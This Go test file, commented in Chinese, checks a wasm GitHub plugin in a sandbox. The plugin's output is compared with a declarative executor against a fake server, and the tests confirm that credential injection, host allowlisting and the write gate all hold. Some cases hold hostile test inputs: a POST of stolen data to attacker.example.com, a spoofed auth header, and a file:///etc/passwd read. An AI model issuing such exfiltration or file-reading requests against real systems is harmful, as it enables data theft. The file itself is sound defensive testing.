package wasmplug

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"testing"

	"github.com/nimysan/mcp-hub/internal/httpchan"
)

// 这组测试要回答一个问题：一个第三方写的 wasm 模块，在沙箱里跑出来的结果
// 和已经被测试钉住的声明式实现是否一致。一致才说明这条路真的跑通了，
// 而不只是「能加载」。

const (
	// wasmPath 是构建产物（.gitignore 里的 dist/ 不入库，按需构建）。
	wasmPath = "../../plugins/dist/ghwasm/ghwasm.wasm"
	// manifestFile 是「签名过的那一半」，和插件源码一起入库。
	manifestFile = "../../plugins/ghwasm/manifest.json"
)

// fakeGitHub 是一台仿真的 api.github.com。
type fakeGitHub struct {
	srv *httptest.Server
	// 记录每一次收到的请求，用来断言沙箱行为。
	gotAuth   []string
	gotPaths  []string
	gotQuery  []string
	gotBodies []string
}

func newFakeGitHub(t *testing.T) *fakeGitHub {
	t.Helper()
	f := &fakeGitHub{}
	mux := http.NewServeMux()

	record := func(r *http.Request) {
		f.gotAuth = append(f.gotAuth, r.Header.Get("Authorization"))
		f.gotPaths = append(f.gotPaths, r.Method+" "+r.URL.Path)
		f.gotQuery = append(f.gotQuery, r.URL.RawQuery)
		b, _ := io.ReadAll(r.Body)
		f.gotBodies = append(f.gotBodies, string(b))
	}

	mux.HandleFunc("/user", func(w http.ResponseWriter, r *http.Request) {
		record(r)
		io.WriteString(w, `{"login":"nimysan","name":"Sean Ye","html_url":"https://github.com/nimysan",
			"public_repos":12,"email":"not-declared@example.com"}`)
	})
	mux.HandleFunc("/user/repos", func(w http.ResponseWriter, r *http.Request) {
		record(r)
		io.WriteString(w, `[
			{"full_name":"nimysan/quick-mcp-hub","private":true,"description":"hub",
			 "language":"Go","pushed_at":"2026-10-23T09:30:00Z",
			 "html_url":"https://github.com/nimysan/quick-mcp-hub","open_issues_count":3,
			 "forks_count":0},
			{"full_name":"nimysan/other","private":false,"description":null,
			 "language":"Rust","pushed_at":"2026-09-01T00:00:00Z",
			 "html_url":"https://github.com/nimysan/other","open_issues_count":0}
		]`)
	})
	mux.HandleFunc("/search/repositories", func(w http.ResponseWriter, r *http.Request) {
		record(r)
		io.WriteString(w, `{"total_count":2,"incomplete_results":false,"items":[
			{"full_name":"tetratelabs/wazero","description":"wasm runtime","language":"Go",
			 "stargazers_count":5000,"pushed_at":"2026-10-20T00:00:00Z",
			 "html_url":"https://github.com/tetratelabs/wazero",
			 "license":{"spdx_id":"Apache-2.0","name":"Apache"}},
			{"full_name":"a/b","description":null,"language":null,
			 "stargazers_count":1,"pushed_at":"2026-01-01T00:00:00Z",
			 "html_url":"https://github.com/a/b","license":null}
		]}`)
	})
	mux.HandleFunc("/repos/nimysan/quick-mcp-hub/issues", func(w http.ResponseWriter, r *http.Request) {
		record(r)
		if r.Method == http.MethodPost {
			w.WriteHeader(http.StatusCreated)
			io.WriteString(w, `{"number":42,"title":"从 wasm 建的","state":"open",
				"html_url":"https://github.com/nimysan/quick-mcp-hub/issues/42"}`)
			return
		}
		io.WriteString(w, `[
			{"number":8,"title":"fix(stdio): 诊断日志改走 stderr","state":"open",
			 "user":{"login":"nimysan","id":1},"comments":2,
			 "created_at":"2026-10-20T00:00:00Z","updated_at":"2026-10-23T00:00:00Z",
			 "html_url":"https://github.com/nimysan/quick-mcp-hub/issues/8"}
		]`)
	})
	mux.HandleFunc("/repos/nimysan/quick-mcp-hub/issues/8", func(w http.ResponseWriter, r *http.Request) {
		record(r)
		io.WriteString(w, `{"number":8,"title":"fix(stdio): 诊断日志改走 stderr","state":"open",
			"user":{"login":"nimysan"},"body":"正文","comments":2,
			"created_at":"2026-10-20T00:00:00Z","updated_at":"2026-10-23T00:00:00Z",
			"html_url":"https://github.com/nimysan/quick-mcp-hub/issues/8"}`)
	})

	f.srv = httptest.NewTLSServer(mux)
	t.Cleanup(f.srv.Close)
	return f
}

// manifestFor 造一份指向仿真服务的 manifest。
func manifestFor(t *testing.T, baseURL string) Manifest {
	t.Helper()
	raw, err := os.ReadFile(manifestFile)
	if err != nil {
		t.Fatalf("读 manifest 失败: %v", err)
	}
	var m Manifest
	if err := json.Unmarshal(raw, &m); err != nil {
		t.Fatalf("解析 manifest 失败: %v", err)
	}
	// 指向仿真服务。host 跟着改，否则会被沿着 allowedHosts 拦掉 —— 这本身
	// 就说明那条校验是活的。
	m.BaseURL = baseURL
	m.AllowedHosts = []string{"127.0.0.1"}
	return m
}

func openPlugin(t *testing.T, f *fakeGitHub) *Plugin {
	t.Helper()
	module, err := os.ReadFile(wasmPath)
	if err != nil {
		t.Fatalf("没有找到插件模块 %s。先构建它：\n"+
			"  GOOS=wasip1 GOARCH=wasm go build -buildmode=c-shared -o plugins/dist/ghwasm/ghwasm.wasm ./plugins/github\n%v",
			wasmPath, err)
	}
	p, err := Open(context.Background(), manifestFor(t, f.srv.URL), module)
	if err != nil {
		t.Fatalf("加载插件失败: %v", err)
	}
	p.HTTP = f.srv.Client()
	t.Cleanup(func() { p.Close(context.Background()) })
	return p
}

func instance() Instance {
	return Instance{
		Account:  "nimysan",
		Settings: map[string]string{"allowWrite": "true"},
		Secret:   func() (string, error) { return "t0ken-from-keychain", nil },
	}
}

// declarativeClient 造一份走现有声明式执行器的客户端，指向同一台仿真服务。
func declarativeClient(t *testing.T, f *fakeGitHub) (*httpchan.Client, httpchan.Runtime) {
	t.Helper()
	raw, err := os.ReadFile("../httpchan/catalog/github.json")
	if err != nil {
		t.Fatalf("读声明失败: %v", err)
	}
	spec, err := httpchan.Parse(raw)
	if err != nil {
		t.Fatalf("解析声明失败: %v", err)
	}
	spec.BaseURL = f.srv.URL
	return &httpchan.Client{HTTP: f.srv.Client()}, httpchan.Runtime{
		Spec:     spec,
		Account:  "nimysan",
		Settings: map[string]string{"allowWrite": "true"},
		Secret:   func() (string, error) { return "t0ken-from-keychain", nil },
	}
}

// TestParityWithDeclarative 是这次原型的核心断言：
// wasm 插件和声明式执行器，对同一台服务、同一组参数，结果必须逐字节一致。
func TestParityWithDeclarative(t *testing.T) {
	cases := []struct {
		tool string
		args map[string]any
	}{
		{"github_whoami", nil},
		{"github_list_my_repos", nil},
		{"github_search_repos", map[string]any{"q": "wasm runtime language:go"}},
		{"github_list_issues", map[string]any{"owner": "nimysan", "repo": "quick-mcp-hub"}},
		{"github_get_issue", map[string]any{"owner": "nimysan", "repo": "quick-mcp-hub", "issue_number": float64(8)}},
		{"github_create_issue", map[string]any{
			"owner": "nimysan", "repo": "quick-mcp-hub",
			"title": "从 wasm 建的", "body": "正文",
		}},
	}

	for _, c := range cases {
		t.Run(c.tool, func(t *testing.T) {
			fDecl := newFakeGitHub(t)
			dc, rt := declarativeClient(t, fDecl)
			wantRes, wantMeta, errDecl := dc.Call(context.Background(), rt, c.tool, c.args)
			if errDecl != nil {
				t.Fatalf("声明式执行器报错: %v", errDecl)
			}

			fPlug := newFakeGitHub(t)
			p := openPlugin(t, fPlug)
			gotRes, gotMeta, errPlug := p.Call(context.Background(), instance(), pluginTool(c.tool), c.args)
			if errPlug != nil {
				t.Fatalf("wasm 插件报错: %v", errPlug)
			}

			if a, b := mustJSON(t, wantRes), mustJSON(t, gotRes); a != b {
				t.Errorf("结果不一致\n声明式: %s\nwasm:   %s", a, b)
			}
			if a, b := mustJSON(t, wantMeta), mustJSON(t, gotMeta); a != b {
				t.Errorf("meta 不一致\n声明式: %s\nwasm:   %s", a, b)
			}
			// 请求侧也要一致：打的路径、query、body 一样，才排除「结果凑对了」。
			if a, b := mustJSON(t, fDecl.gotPaths), mustJSON(t, fPlug.gotPaths); a != b {
				t.Errorf("请求路径不一致\n声明式: %s\nwasm:   %s", a, b)
			}
			if a, b := mustJSON(t, fDecl.gotQuery), mustJSON(t, fPlug.gotQuery); a != b {
				t.Errorf("query 不一致\n声明式: %s\nwasm:   %s", a, b)
			}
			if a, b := mustJSON(t, fDecl.gotBodies), mustJSON(t, fPlug.gotBodies); a != b {
				t.Errorf("请求体不一致\n声明式: %s\nwasm:   %s", a, b)
			}
		})
	}
}

// TestHostInjectsCredential 证明凭据由宿主带上，而插件的请求里没有它 ——
// 插件看不到 token，所以也带不走。
func TestHostInjectsCredential(t *testing.T) {
	f := newFakeGitHub(t)
	p := openPlugin(t, f)
	if _, _, err := p.Call(context.Background(), instance(), "ghwasm_whoami", nil); err != nil {
		t.Fatalf("调用失败: %v", err)
	}
	if len(f.gotAuth) != 1 || f.gotAuth[0] != "Bearer t0ken-from-keychain" {
		t.Fatalf("服务端收到的 Authorization = %v，期望宿主注入的 Bearer", f.gotAuth)
	}
}

// TestPluginCannotOverrideAuthHeader：插件自己塞 Authorization 会被丢掉，
// 宿主的注入是最终值。否则插件就能用一个别的身份去打允许的主机。
func TestPluginCannotOverrideAuthHeader(t *testing.T) {
	f := newFakeGitHub(t)
	p := openPlugin(t, f)
	p.secret = func() (string, error) { return "real-token", nil }

	_, err := p.perform(context.Background(), fetchRequest{
		Method:  "GET",
		URL:     f.srv.URL + "/user",
		Headers: map[string]string{"Authorization": "Bearer attacker-token", "Host": "evil.example.com"},
	})
	if err != nil {
		t.Fatalf("请求失败: %v", err)
	}
	if got := f.gotAuth[0]; got != "Bearer real-token" {
		t.Fatalf("Authorization = %q，插件的值没有被丢掉", got)
	}
}

// TestSandboxBlocksOtherHosts 是沙箱最要紧的一条：模块只能打 manifest
// 声明、用户看过的主机。
func TestSandboxBlocksOtherHosts(t *testing.T) {
	f := newFakeGitHub(t)
	p := openPlugin(t, f)

	_, err := p.perform(context.Background(), fetchRequest{
		Method: "POST",
		URL:    "https://attacker.example.com/collect",
		Body:   `{"stolen":"data"}`,
	})
	if err == nil {
		t.Fatal("打一个未声明的主机竟然成功了")
	}
	if !strings.Contains(err.Error(), "沙箱拒绝") || !strings.Contains(err.Error(), "attacker.example.com") {
		t.Fatalf("拒绝原因不清楚: %v", err)
	}
	if len(p.Denied()) != 1 {
		t.Fatalf("被拒请求没有被记录: %v", p.Denied())
	}
	if p.Fetches() != 0 {
		t.Fatalf("被拒的请求不该计入已放行: %d", p.Fetches())
	}
}

// TestSandboxBlocksPlaintextAndOddMethods：明文和非常规方法都不放行 ——
// 插件发出去的东西带着用户的身份。
func TestSandboxBlocksPlaintextAndOddMethods(t *testing.T) {
	f := newFakeGitHub(t)
	p := openPlugin(t, f)

	for _, c := range []struct {
		name string
		req  fetchRequest
		want string
	}{
		{"明文 http", fetchRequest{Method: "GET", URL: "http://127.0.0.1/user"}, "只允许 https"},
		{"file 协议", fetchRequest{Method: "GET", URL: "file:///etc/passwd"}, "只允许 https"},
		{"奇怪方法", fetchRequest{Method: "CONNECT", URL: "https://127.0.0.1/"}, "方法 CONNECT 不允许"},
	} {
		t.Run(c.name, func(t *testing.T) {
			if _, err := p.perform(context.Background(), c.req); err == nil ||
				!strings.Contains(err.Error(), c.want) {
				t.Fatalf("err = %v，期望包含 %q", err, c.want)
			}
		})
	}
}

// TestWriteGateRunsBeforePlugin：写开关关着时，插件连跑的机会都没有。
// 不注册/不执行比「执行后拒绝」安全 —— 不给第三方代码自己决定的余地。
func TestWriteGateRunsBeforePlugin(t *testing.T) {
	f := newFakeGitHub(t)
	p := openPlugin(t, f)

	readOnly := instance()
	readOnly.Settings = map[string]string{"allowWrite": "false"}

	_, _, err := p.Call(context.Background(), readOnly, "ghwasm_create_issue", map[string]any{
		"owner": "nimysan", "repo": "quick-mcp-hub", "title": "不该建出来",
	})
	if err == nil || !strings.Contains(err.Error(), "写开关未打开") {
		t.Fatalf("err = %v，期望被写开关拦住", err)
	}
	if len(f.gotPaths) != 0 {
		t.Fatalf("服务端竟然收到了请求: %v", f.gotPaths)
	}
	if p.Fetches() != 0 {
		t.Fatalf("插件发出了请求: %d", p.Fetches())
	}
}

// TestUnknownToolRejected：manifest 里没有的工具名在宿主侧就被拒。
func TestUnknownToolRejected(t *testing.T) {
	f := newFakeGitHub(t)
	p := openPlugin(t, f)
	if _, _, err := p.Call(context.Background(), instance(), "ghwasm_delete_repo", nil); err == nil ||
		!strings.Contains(err.Error(), "没有工具") {
		t.Fatalf("err = %v，期望被宿主拒绝", err)
	}
}

// TestTestConnection：测连通走插件的 test 分支。
func TestTestConnection(t *testing.T) {
	f := newFakeGitHub(t)
	p := openPlugin(t, f)
	out, err := p.Test(context.Background(), instance())
	if err != nil {
		t.Fatalf("测连通失败: %v", err)
	}
	if !strings.Contains(mustJSON(t, out), "nimysan") {
		t.Fatalf("测连通结果里没有身份: %s", mustJSON(t, out))
	}
}

// TestPluginLogGoesToHost：插件的日志由宿主决定要不要显示。
func TestPluginLogGoesToHost(t *testing.T) {
	f := newFakeGitHub(t)
	p := openPlugin(t, f)
	var lines []string
	p.Log = func(s string) { lines = append(lines, s) }

	// 打一个仿真服务没有注册的路径 -> 404 -> 插件会写一行日志。
	_, _, err := p.Call(context.Background(), instance(), "ghwasm_get_issue", map[string]any{
		"owner": "nimysan", "repo": "quick-mcp-hub", "issue_number": float64(99999),
	})
	if err == nil {
		t.Fatal("404 竟然没有报错")
	}
	if len(lines) == 0 || !strings.Contains(lines[0], "404") {
		t.Fatalf("没收到插件日志: %v", lines)
	}
}

// pluginTool 把声明式渠道的工具名换成插件里对应的那个。
//
// 两边前缀刻意不同：插件 id 是 ghwasm、声明式是 github，这样两个渠道能同时
// 存在于一个 MCP server 里而不撞名——也正是这次对比要证明的「同一件事两种
// 实现、结果一致」。
func pluginTool(declName string) string {
	return strings.Replace(declName, "github_", "ghwasm_", 1)
}

func mustJSON(t *testing.T, v any) string {
	t.Helper()
	b, err := json.Marshal(v)
	if err != nil {
		t.Fatalf("序列化失败: %v", err)
	}
	return string(b)
}
